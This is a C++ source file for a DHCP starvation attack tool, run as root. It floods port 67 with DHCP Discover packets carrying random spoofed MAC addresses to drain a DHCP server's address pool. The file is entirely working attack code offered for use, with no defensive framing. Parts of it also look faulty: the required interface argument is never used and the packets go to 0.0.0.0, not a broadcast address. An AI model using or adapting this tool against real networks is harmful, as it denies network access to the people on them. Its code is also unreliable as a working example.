// Compile: g++ -o dhcp_starve dhcp_starve.cpp
// Run: sudo ./dhcp_starve <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <random>

class DHCPStarvation {
private:
    int sock;
    
    std::string randomMAC() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        char mac[18];
        snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                 dis(gen), dis(gen), dis(gen), dis(gen), dis(gen), dis(gen));
        return std::string(mac);
    }
    
public:
    DHCPStarvation() {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) { perror("socket"); exit(1); }
        
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(68);
        
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void starve(int count) {
        struct sockaddr_in broadcast;
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(67);
        broadcast.sin_addr.s_addr = INADDR_ANY;
        
        for (int i = 0; i < count; i++) {
            char packet[1024];
            memset(packet, 0, sizeof(packet));
            
            packet[0] = 1;  // Boot request
            packet[1] = 1;  // Ethernet
            packet[2] = 6;  // MAC length
            packet[3] = 0;  // Hops
            
            // Random transaction ID
            *(uint32_t*)(packet + 4) = rand();
            
            // Random MAC
            std::string mac = randomMAC();
            sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &packet[28], &packet[29], &packet[30],
                   &packet[31], &packet[32], &packet[33]);
            
            // Magic cookie
            packet[236] = 0x63;
            packet[237] = 0x82;
            packet[238] = 0x53;
            packet[239] = 0x63;
            
            // DHCP Discover
            packet[240] = 0x35;
            packet[241] = 0x01;
            packet[242] = 0x01;
            
            // End
            packet[243] = 0xFF;
            
            sendto(sock, packet, 244, 0, 
                   (struct sockaddr*)&broadcast, sizeof(broadcast));
            
            usleep(10000);
        }
    }
    
    ~DHCPStarvation() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) { std::cerr << "Usage: " << argv[0] << " <interface>\n"; return 1; }
    srand(time(NULL));
    DHCPStarvation starve;
    starve.starve(1000);
    return 0;
}